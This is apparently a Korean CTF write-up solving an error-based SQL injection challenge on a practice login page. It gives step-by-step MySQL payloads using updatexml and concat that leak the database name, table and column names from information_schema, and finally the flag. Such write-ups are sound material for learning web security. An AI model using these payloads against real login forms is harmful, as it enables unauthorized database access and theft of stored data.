# DB 데이터 추출 2
Error Based SQL Injection

http://ctf.segfaulthub.com:9999/sqli_2/login.php

---
로그인 화면.

일단 아무 거나 넣어서 로그인을 시도해보자.

![1](https://user-images.githubusercontent.com/106296883/233789180-d87715f8-46de-45cd-9af1-660e789e417d.PNG)
```
id : nor' 
```
nor' 을 치니까 SQL syntax error 가 떳다.   
MySQL 을 사용하는 것을 확인할 수 있다.   
MySQL 구문을 이용해서 진행해야 한다.

일단 기본 구조를 생각해보자.
```
select ??? from ??? where id = ''
```
일 것이다. 아이디는 유니크해야 하기 때문이다.

일단 Error Based SQL Injection Function 을 사용하자.
```
1' and updatexml(null,concat(0x3a,'test'),null) and '1'='1  
```
위 구문을 id 칸에 넣어보자.

![2](https://user-images.githubusercontent.com/106296883/233789426-1615dcc8-a304-48ea-aeae-f2e895b9daf9.PNG)

:test 파일을 찾을 수 없다는 논리 에러가 떳다.

EBSIF 가 성공적으로 실행됐다는 의미이다.

```
1' and updatexml(null,concat(0x3a,(select 'test')),null) and '1'='1  
```
역시 같은 에러가 발생한다.

SQL Injection 이 가능하다고 판단할 수 있다.

먼저 DB 이름을 확인해보자
```
1' and updatexml(null,concat(0x3a,(select database())),null) and '1'='1  
```
![3](https://user-images.githubusercontent.com/106296883/233789816-1411f969-7df4-46bc-b10d-fa727c6c1619.PNG)

sqli_2    
DB 이름을 확인했다.

다음은 table 이름 확인
```
select table_name from information_schema.tables where table_schema='sqli_2' 
```
```
1' and updatexml(null,concat(0x3a,(select table_name from information_schema.tables where table_schema='sqli_2' )),null) and '1'='1  
```
![4](https://user-images.githubusercontent.com/106296883/233789874-80424b26-17ae-4643-b33e-79791cfffad5.PNG)

1개 이상의 결과가 출력되려고 해서 해당 오류가 발생했다.

limit 를 이용해서 하나씩 출력하게 만들자.

limit 0,1 = 첫 번째 데이터에서 1개만 출력
```
1' and updatexml(null,concat(0x3a,(select table_name from information_schema.tables where table_schema='sqli_2' limit 0,1)),null) and '1'='1  
```
![5](https://user-images.githubusercontent.com/106296883/233790001-d5418ba0-c7b4-4e62-9838-ce0cfd34f03e.PNG)

원하는 테이블이 바로 나왔다.

이제는 column 이름을 찾아보자.
```
select column_name from information_schema.columns where table_name='flag_table' limit 0,1
```
```
1' and updatexml(null,concat(0x3a,(select column_name from information_schema.columns where table_name='flag_table' limit 0,1)),null) and '1'='1  
```
![6](https://user-images.githubusercontent.com/106296883/233790079-4c4aafde-d99d-43d0-8e05-ed9a8974cc8d.PNG)

바로 column 이름까지 확인.

그렇다면 데이터를 추출하자.
```
select flag from flag_tabel
```
```
    1' and updatexml(null,concat(0x3a,(select flag from flag_table)),null) and '1'='1  
```
![7](https://user-images.githubusercontent.com/106296883/233790227-d4462402-2fb0-4479-8497-cb3f5b6ede32.PNG)

flag 획득!

